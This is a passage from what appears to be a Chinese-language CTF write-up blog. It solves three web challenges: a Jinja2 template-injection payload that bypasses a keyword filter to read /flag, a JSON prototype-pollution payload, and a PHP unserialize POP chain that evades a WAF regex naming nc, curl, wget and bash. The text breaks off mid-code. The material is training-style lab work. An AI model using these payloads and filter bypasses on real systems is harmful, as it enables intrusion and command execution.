&#x27;getset_descriptor&#x27;&gt;, &lt;class &#x27;wrapper_descriptor&#x27;&gt;, &lt;class &#x27;method-wrapper&#x27;&gt;, &lt;class &#x27;ellipsis&#x27;&gt;, &lt;class &#x27;member_descriptor&#x27;&gt;, &lt;class &#x27;types.SimpleNamespace&#x27;&gt;, &lt;class &#x27;PyCapsule&#x27;&gt;, &lt;class &#x27;longrange_iterator&#x27;&gt;, &lt;class &#x27;cell&#x27;&gt;, &lt;class &#x27;instancemethod&#x27;&gt;, &lt;class &#x27;classmethod_descriptor&#x27;&gt;, &lt;class &#x27;method_descriptor&#x27;&gt;, &lt;class &#x27;callable_iterator&#x27;&gt;, &lt;class &#x27;iterator&#x27;&gt;, &lt;class &#x27;pickle.PickleBuffer&#x27;&gt;, &lt;class &#x27;coroutine&#x27;&gt;, &lt;class &#x27;coroutine_wrapper&#x27;&gt;, &lt;class &#x27;InterpreterID&#x27;&gt;, &lt;class &#x27;EncodingMap&#x27;&gt;, &lt;class &#x27;fieldnameiterator&#x27;&gt;, &lt;class &#x27;formatteriterator&#x27;&gt;, &lt;class &#x27;BaseException&#x27;&gt;, &lt;class &#x27;hamt&#x27;&gt;, &lt;class &#x27;hamt_array_node&#x27;&gt;, &lt;class &#x27;hamt_bitmap_node&#x27;&gt;, &lt;class &#x27;hamt_collision_node&#x27;&gt;, &lt;class &#x27;keys&#x27;&gt;, &lt;class &#x27;values&#x27;&gt;, &lt;class &#x27;items&#x27;&gt;, &lt;class &#x27;Context&#x27;&gt;, &lt;class &#x27;ContextVar&#x27;&gt;, &lt;class &#x27;Token&#x27;&gt;, &lt;class &#x27;Token.MISSING&#x27;&gt;, &lt;class &#x27;moduledef&#x27;&gt;, &lt;class &#x27;module&#x27;&gt;, &lt;class &#x27;filter&#x27;&gt;, &lt;class &#x27;map&#x27;&gt;, &lt;class &#x27;zip&#x27;&gt;, &lt;class &#x27;_frozen_importlib._ModuleLock&#x27;&gt;, &lt;class &#x27;_frozen_importlib._DummyModuleLock&#x27;&gt;, &lt;class &#x27;_frozen_importlib._ModuleLockManager&#x27;&gt;, &lt;class &#x27;_frozen_importlib.ModuleSpec&#x27;&gt;, &lt;class &#x27;_frozen_importlib.BuiltinImporter&#x27;&gt;, &lt;class &#x27;classmethod&#x27;&gt;, &lt;class &#x27;_frozen_importlib.FrozenImporter&#x27;&gt;, &lt;class &#x27;_frozen_importlib._ImportLockContext&#x27;&gt;, &lt;class &#x27;_thread._localdummy&#x27;&gt;, &lt;class &#x27;_thread._local&#x27;&gt;, &lt;class &#x27;_thread.lock&#x27;&gt;, &lt;class &#x27;_thread.RLock&#x27;&gt;, &lt;class &#x27;_io._IOBase&#x27;&gt;, &lt;class &#x27;_io._BytesIOBuffer&#x27;&gt;, &lt;class &#x27;_io.IncrementalNewlineDecoder&#x27;&gt;, &lt;class &#x27;posix.ScandirIterator&#x27;&gt;, &lt;class &#x27;posix.DirEntry&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.WindowsRegistryFinder&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external._LoaderBasics&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.FileLoader&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external._NamespacePath&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external._NamespaceLoader&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.PathFinder&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.FileFinder&#x27;&gt;, &lt;class &#x27;zipimport.zipimporter&#x27;&gt;, &lt;class &#x27;zipimport._ZipImportResourceReader&#x27;&gt;, &lt;class &#x27;codecs.Codec&#x27;&gt;, &lt;class &#x27;codecs.IncrementalEncoder&#x27;&gt;, &lt;class &#x27;codecs.IncrementalDecoder&#x27;&gt;, &lt;class &#x27;codecs.StreamReaderWriter&#x27;&gt;, &lt;class &#x27;codecs.StreamRecoder&#x27;&gt;, &lt;class &#x27;_abc_data&#x27;&gt;, &lt;class &#x27;abc.ABC&#x27;&gt;, &lt;class &#x27;dict_itemiterator&#x27;&gt;, &lt;class &#x27;collections.abc.Hashable&#x27;&gt;, &lt;class &#x27;collections.abc.Awaitable&#x27;&gt;, &lt;class &#x27;collections.abc.AsyncIterable&#x27;&gt;, &lt;class &#x27;async_generator&#x27;&gt;, &lt;class &#x27;collections.abc.Iterable&#x27;&gt;, &lt;class &#x27;bytes_iterator&#x27;&gt;, &lt;class &#x27;bytearray_iterator&#x27;&gt;, &lt;class &#x27;dict_keyiterator&#x27;&gt;, &lt;class &#x27;dict_valueiterator&#x27;&gt;, &lt;class &#x27;list_iterator&#x27;&gt;, &lt;class &#x27;list_reverseiterator&#x27;&gt;, &lt;class &#x27;range_iterator&#x27;&gt;, &lt;class &#x27;set_iterator&#x27;&gt;, &lt;class &#x27;str_iterator&#x27;&gt;, &lt;class &#x27;tuple_iterator&#x27;&gt;, &lt;class &#x27;collections.abc.Sized&#x27;&gt;, &lt;class &#x27;collections.abc.Container&#x27;&gt;, &lt;class &#x27;collections.abc.Callable&#x27;&gt;, &lt;class &#x27;os._wrap_close&#x27;&gt;&quot;</span><br><br><br><span class="hljs-comment"># 使用正则表达式提取类名</span><br>class_names = re.findall(<span class="hljs-string">r&quot;&lt;class &#x27;([^&#x27;]+)&#x27;&quot;</span>, a)<br><br><span class="hljs-comment"># 输出整个数组</span><br><span class="hljs-built_in">print</span>(class_names)<br><br><span class="hljs-comment"># 输出&#x27;int&#x27;所在的位置</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;int 所在的位置:&quot;</span>, class_names.index(<span class="hljs-string">&quot;os._wrap_close&quot;</span>))<br><br><span class="hljs-comment">#132</span><br></code></pre></td></tr></table></figure>带有`Printer`和`Error`的模块没找到，就去找带有`os`的了然后利用`.__init__.__globals__['os']`去访问`os`这个模块以调用函数：`secr3tofpop?name=&#123;%%20print([].__class__.__base__.__subclasses__()[132].__init__.__globals__[%27os%27])%20%&#125;</code></p><p>又触发了过滤。。尝试后发现<code>init</code>这东西不让用(同时过滤大小写)，参考：<code>[SSTI模板注入绕过（进阶篇）_ssti绕过-CSDN博客](https://blog.csdn.net/miuzzx/article/details/110220425)</code></p><p><code>/secr3tofpop?name=&#123;%%20print([].__class__.__base__.__subclasses__()[132])%20%&#125;</code></p><p>考虑使用拼接绕过：</p><p><code>/secr3tofpop?name=&#123;%%20print([].__class__.__base__.__subclasses__()[132][%22__in%22+%22it__%22][%22__glo%22+%22bals__%22][%22po%22%22pen%22](%22ls%22).read())%20%&#125;</code></p><p><img src="/img/genshin14.png" alt="genshin14"></p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">/secr3tofpop?name=&#123;%%<span class="hljs-number">20</span><span class="hljs-keyword">print</span>([].__class__.__base__.__subclasses__()[<span class="hljs-number">132</span>][%22__in%22+%22it__%22][%22__glo%22+%22bals__%22][%22po%22%22pen%22](%22cat%20/flag%22).read())%20%&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/genshin13.png" alt="genshin13"></p><p>这题解法一大堆，其它<code>payload</code>可以参考：<code>https://www.cnblogs.com/Article-kelp/p/14797393.html#5228271</code></p><h2 id="OtenkiGirl"><a href="#OtenkiGirl" class="headerlink" title="OtenkiGirl"></a>OtenkiGirl</h2><p>提示：rain… spread… pollute…，初步判断原型链污染</p><p><img src="/img/otengirl1.png" alt="otengirl1"></p><p>下载<code>o.zip</code>附件：</p><p><img src="/img/otengirl2.png" alt="otengirl2"></p><p>。。。。太多了，<code>hint.txt</code>打开发现是段日语：<code>『「routes」フォルダーだけを見てください。SQLインジェクションはありません。』と御坂御坂は期待に満ちた気持ちで言った。</code></p><p>翻译：<code>御坂御坂满怀期待地说道：“请只查看&#39;routes&#39;文件夹。没有SQL注入问题。</code></p><p>那就看看<code>routes</code>:</p><p><img src="/img/otengirl4.png" alt="otengirl4"></p><p>首先是<code>info.js</code>:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-title class_">Router</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;koa-router&quot;</span>);<br><span class="hljs-keyword">const</span> router = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Router</span>();<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">SQL</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;./sql&quot;</span>);<br><span class="hljs-keyword">const</span> sql = <span class="hljs-keyword">new</span> <span class="hljs-title function_">SQL</span>(<span class="hljs-string">&quot;wishes&quot;</span>);<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">CONFIG</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;../config&quot;</span>)<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">DEFAULT_CONFIG</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;../config.default&quot;</span>)<br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">getInfo</span>(<span class="hljs-params">timestamp</span>) &#123;<span class="hljs-comment">//getInfo异步函数</span><br>    timestamp = <span class="hljs-keyword">typeof</span> timestamp === <span class="hljs-string">&quot;number&quot;</span> ? timestamp : <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();<span class="hljs-comment">//检查传入的timestamp参数是否为数字类型，如果不是则将其设置为当前时间戳</span><br>    <span class="hljs-comment">// Remove test data from before the movie was released</span><br>    <span class="hljs-keyword">let</span> minTimestamp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(<span class="hljs-variable constant_">CONFIG</span>.<span class="hljs-property">min_public_time</span> || <span class="hljs-variable constant_">DEFAULT_CONFIG</span>.<span class="hljs-property">min_public_time</span>).<span class="hljs-title function_">getTime</span>();<span class="hljs-comment">//将min_public_time转换为时间戳，使用应用程序配置中的最小公开时间，如果没有配置，则使用默认配置中的最小公开时间</span><br>    timestamp = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(timestamp, minTimestamp);<span class="hljs-comment">//确保timestamp不会早于minTimestamp</span><br>    <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> sql.<span class="hljs-title function_">all</span>(<span class="hljs-string">`SELECT wishid, date, place, contact, reason, timestamp FROM wishes WHERE timestamp &gt;= ?`</span>, [timestamp]).<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> &#123; <span class="hljs-keyword">throw</span> e &#125;);<br>    <span class="hljs-keyword">return</span> data;<br>&#125;<br><br>router.<span class="hljs-title function_">post</span>(<span class="hljs-string">&quot;/info/:ts?&quot;</span>, <span class="hljs-keyword">async</span> (ctx) =&gt; &#123;<br>    <span class="hljs-keyword">if</span> (ctx.<span class="hljs-property">header</span>[<span class="hljs-string">&quot;content-type&quot;</span>] !== <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>)<br>        <span class="hljs-keyword">return</span> ctx.<span class="hljs-property">body</span> = &#123;<br>            <span class="hljs-attr">status</span>: <span class="hljs-string">&quot;error&quot;</span>,<br>            <span class="hljs-attr">msg</span>: <span class="hljs-string">&quot;Content-Type must be application/x-www-form-urlencoded&quot;</span><br>        &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> ctx.<span class="hljs-property">params</span>.<span class="hljs-property">ts</span> === <span class="hljs-string">&quot;undefined&quot;</span>) ctx.<span class="hljs-property">params</span>.<span class="hljs-property">ts</span> = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">const</span> timestamp = <span class="hljs-regexp">/^[0-9]+$/</span>.<span class="hljs-title function_">test</span>(ctx.<span class="hljs-property">params</span>.<span class="hljs-property">ts</span> || <span class="hljs-string">&quot;&quot;</span>) ? <span class="hljs-title class_">Number</span>(ctx.<span class="hljs-property">params</span>.<span class="hljs-property">ts</span>) : ctx.<span class="hljs-property">params</span>.<span class="hljs-property">ts</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> timestamp !== <span class="hljs-string">&quot;number&quot;</span>)<br>        <span class="hljs-keyword">return</span> ctx.<span class="hljs-property">body</span> = &#123;<br>            <span class="hljs-attr">status</span>: <span class="hljs-string">&quot;error&quot;</span>,<br>            <span class="hljs-attr">msg</span>: <span class="hljs-string">&quot;Invalid parameter ts&quot;</span><br>        &#125;<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> <span class="hljs-title function_">getInfo</span>(timestamp).<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> &#123; <span class="hljs-keyword">throw</span> e &#125;);<br>        ctx.<span class="hljs-property">body</span> = &#123;<br>            <span class="hljs-attr">status</span>: <span class="hljs-string">&quot;success&quot;</span>,<br>            <span class="hljs-attr">data</span>: data<br>        &#125;<br>    &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(e);<br>        <span class="hljs-keyword">return</span> ctx.<span class="hljs-property">body</span> = &#123;<br>            <span class="hljs-attr">status</span>: <span class="hljs-string">&quot;error&quot;</span>,<br>            <span class="hljs-attr">msg</span>: <span class="hljs-string">&quot;Internal Server Error&quot;</span><br>        &#125;<br>    &#125;<br>&#125;)<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = router;<br><span class="hljs-comment">//主要就是getInfo这个函数，剩下的就是一些返回状态啥的</span><br></code></pre></td></tr></table></figure><p>注意注释：<code>Remove test data from before the movie was released</code>，删除电影发布之前的测试数据。那<code>flag</code>应该和电影发布日期之前的某些数据有关。</p><p><code>submit.js</code>(存在<code>merge</code>函数的部分):</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-title function_">merge</span> = (<span class="hljs-params">dst, src</span>) =&gt; &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> dst !== <span class="hljs-string">&quot;object&quot;</span> || <span class="hljs-keyword">typeof</span> src !== <span class="hljs-string">&quot;object&quot;</span>) <span class="hljs-keyword">return</span> dst;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> src) &#123;<br>        <span class="hljs-keyword">if</span> (key <span class="hljs-keyword">in</span> dst &amp;&amp; key <span class="hljs-keyword">in</span> src) &#123;<br>            dst[key] = <span class="hljs-title function_">merge</span>(dst[key], src[key]);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            dst[key] = src[key];<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> dst;<br>&#125;<br><span class="hljs-comment">//以及：</span><br>        <span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> <span class="hljs-title function_">insert2db</span>(<span class="hljs-title function_">merge</span>(<span class="hljs-variable constant_">DEFAULT</span>, data));<span class="hljs-comment">//注意这里！</span><br></code></pre></td></tr></table></figure><p>其实对原型链污染这东西有点了解就会知道：可以通过<strong>对象merge</strong>或 <strong>对象clone</strong>控制<code>对象.__proto__</code>的值，间接修改继承该原型对象的所有对象，举个简单的栗子：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//用于将一个源对象的属性合并到目标对象中</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">target, source</span>) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> source) &#123; <span class="hljs-comment">//遍历source的所有属性</span><br>        <span class="hljs-keyword">if</span> (key <span class="hljs-keyword">in</span> source &amp;&amp; key <span class="hljs-keyword">in</span> target) &#123;<span class="hljs-comment">//对于每个属性，若同时存在于源对象和目标对象中</span><br>            <span class="hljs-title function_">merge</span>(target[key], source[key]) <span class="hljs-comment">//表示这是一个嵌套对象，需要递归调用merge函数，将源对象的嵌套属性合并到目标对象的对应嵌套属性中。</span><br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            target[key] = source[key]<span class="hljs-comment">//非嵌套属性，直接将源对象的属性值赋给目标对象的对应属性。</span><br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//</span><br><br><span class="hljs-keyword">let</span> o1 = &#123;&#125;<br><span class="hljs-keyword">let</span> o2 = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-string">&#x27;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#x27;</span>)<span class="hljs-comment">//JSON.parse的存在可以将JSON字符串解析为JavaScript对象，这样一来就存在o2.__protp__.b=2,并把这东西赋值给之前不存在的o1.__proto__</span><br><span class="hljs-title function_">merge</span>(o1, o2)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(o1.<span class="hljs-property">a</span>, o1.<span class="hljs-property">b</span>)<span class="hljs-comment">//1 2</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(o1.<span class="hljs-property">__proto__</span>)<span class="hljs-comment">//[Object: null prototype] &#123; b: 2 &#125;</span><br>o3 = &#123;&#125;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(o3.<span class="hljs-property">b</span>)<span class="hljs-comment">//2</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(o3.<span class="hljs-property">__proto__</span>)<span class="hljs-comment">//[Object: null prototype] &#123; b: 2 &#125;</span><br></code></pre></td></tr></table></figure><p>我们随便添点数据，抓包看一下：</p><p><code>submit</code>这东西就是提交数据，<code>info/时间戳</code>就是加载底下那些愿望标签(看<code>info.js</code>也能知道)</p><p><img src="/img/otengirl3.png" alt="otengirl3"></p><p><img src="/img/otengirl6.png" alt="otengirl6"></p><p>现在有点思路了：根据</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> minTimestamp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(<span class="hljs-variable constant_">CONFIG</span>.<span class="hljs-property">min_public_time</span> || <span class="hljs-variable constant_">DEFAULT_CONFIG</span>.<span class="hljs-property">min_public_time</span>).<span class="hljs-title function_">getTime</span>();<br><br>timestamp = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(timestamp, minTimestamp);<br></code></pre></td></tr></table></figure><p>我们知道这个<code>timestamp</code>会取<code>timestamp, minTimestamp</code>之间的最大值(保证时间是在电影发布之后)，<code>minTimestamp</code>的话通过创建一个新的Date对象。它首先尝试从<code>CONFIG.min_public_time</code>中获取最小公共时间，如果<code>CONFIG.min_public_time</code>不存在，则使用<code>DEFAULT_CONFIG.min_public_time</code>的值。</p><p>我们去配置文件中找找这个时间是多少：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//config.js</span><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>    <span class="hljs-attr">app_name</span>: <span class="hljs-string">&quot;OtenkiGirl&quot;</span>,<br>    <span class="hljs-attr">default_lang</span>: <span class="hljs-string">&quot;ja&quot;</span>,<br>&#125;<br><span class="hljs-comment">//config.default.js</span><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>    <span class="hljs-attr">app_name</span>: <span class="hljs-string">&quot;OtenkiGirl&quot;</span>,<br>    <span class="hljs-attr">default_lang</span>: <span class="hljs-string">&quot;ja&quot;</span>,<br>    <span class="hljs-attr">min_public_time</span>: <span class="hljs-string">&quot;2019-07-09&quot;</span>,<br>    <span class="hljs-attr">server_port</span>: <span class="hljs-number">9960</span>,<br>    <span class="hljs-attr">webpack_dev_port</span>: <span class="hljs-number">9970</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>config.js</code>中并不存在<code>min_public_time</code>(但<code>config.default.js</code>中存在，所以后面取得值是<code>config.default.js</code>中的。)那么我们可以通过污染<code>config.js</code>，在这个文件中加入我们想要的<code>min_public_time</code>，然后系统就会忽略<code>config.default.js</code>，让时间足够早。</p><p>那么哪里调用了<code>merge</code>函数呢？<code>const result = await insert2db(merge(DEFAULT, data));</code></p><p>简单说下污染原理：<code>merge(DEFAULT, data)</code>会检查<code>DEFAULT, data</code>里面的键，如果某个键他俩都有，那就递归调用<code>merge</code>函数。如果存在某个键他俩不同时拥有，就令<code>DEFAULT[key] = data[key]</code>。</p><p>如果<code>data</code>对象的原型链上存在名为<code>min_public_time</code>的属性，则该属性将被赋值给<code>DEFAULT</code>对象，那么<code>DEFAULT[key]</code>将会指向原型链上的值。在JavaScript中，对象可以具有特殊的属性__proto__，它指向对象的原型。通过修改<code>data[&#39;__proto__&#39;</code>][‘min_public_time’]的值，我们可以影响原型链上的属性:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs json">payload<span class="hljs-punctuation">:</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;date&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;place&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;test&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;contact&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;test&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;reason&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;test&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;timestamp&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1700797610124</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;__proto__&quot;</span><span class="hljs-punctuation">:</span>  <span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;min_public_time&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;1970-01-01&quot;</span><span class="hljs-punctuation">&#125;</span> <span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/img/otengirl7.png" alt="otengirl7"></p><p>然后刷新一下，会抓到<code>info</code>的包：</p><p><img src="/img/otengirl8.png" alt="otengirl8"></p><p>根据前面的代码我们知道<code>info</code>后面跟的数字就是<code>ts</code>，就是那个<code>min_time</code>后再过多少秒(还是毫秒来着，忘了)。刚设置了<code>1970-01-01</code>，后面随便改个小点的数字就行:</p><p><img src="/img/otengirl9.png" alt="otengirl9"></p><p>拿到<code>flag</code></p><h2 id="R-C-E"><a href="#R-C-E" class="headerlink" title="R!!!C!!!E!!!"></a>R!!!C!!!E!!!</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">minipop</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$qwejaskdjnlka</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="hljs-variable">$this</span>-&gt;code))&#123;<br>            <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$this</span>-&gt;code);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;alright&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;qwejaskdjnlka;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;payload&#x27;</span>]))&#123;<br>    <span class="hljs-comment">//wanna try?</span><br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;payload&#x27;</span>]);<br>&#125; <br></code></pre></td></tr></table></figure><p><code>minipop</code>类下存在两个公有属性<code>$code</code>和<code>qwejaskdjnlka</code>以及<code> __toString()</code>方法和<code>__destruct()</code>，<code>__destruct()</code>这东西对象销毁时会自动调用(序列化会调用反序列化也会调用)。<code>__toString()</code>这东西就是一个类被当成字符串时会被调用。</p><p>思路就是通过<code>__destruct()</code>调用<code>__toString()</code>。</p><p>还有就是虽然<code>waf</code>过滤了挺多，不过可以利用拼接的特性<code>比如过滤了ls可以利用l&#39;&#39;s来代替</code></p><p><code>exec</code>函数本身不会将命令的结果直接显示在页面上。它将命令的输出作为字符串返回。<code>eval</code>会更常见</p><p>这题不会做。。参考了这位师傅的文章：<code>https://blog.csdn.net/m0_63138919/article/details/133958661</code></p><p>主要就是利用<code>tee</code>这个命令：</p><p><img src="/img/tee3.png" alt="tee3"></p><p>后缀加不加无所谓，<code>Linux</code>下文件名可以使任何有效的字符串</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">minipop</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$qwejaskdjnlka</span>;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">minipop</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">minipop</span>();<br><span class="hljs-variable">$a</span> -&gt; qwejaskdjnlka = <span class="hljs-variable">$b</span>;<span class="hljs-comment">//通过echo，这时$b这个类的实例被当成字符串了</span><br><span class="hljs-variable">$b</span> -&gt; code = <span class="hljs-string">&quot;ls / | t&#x27;&#x27;ee viper&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ 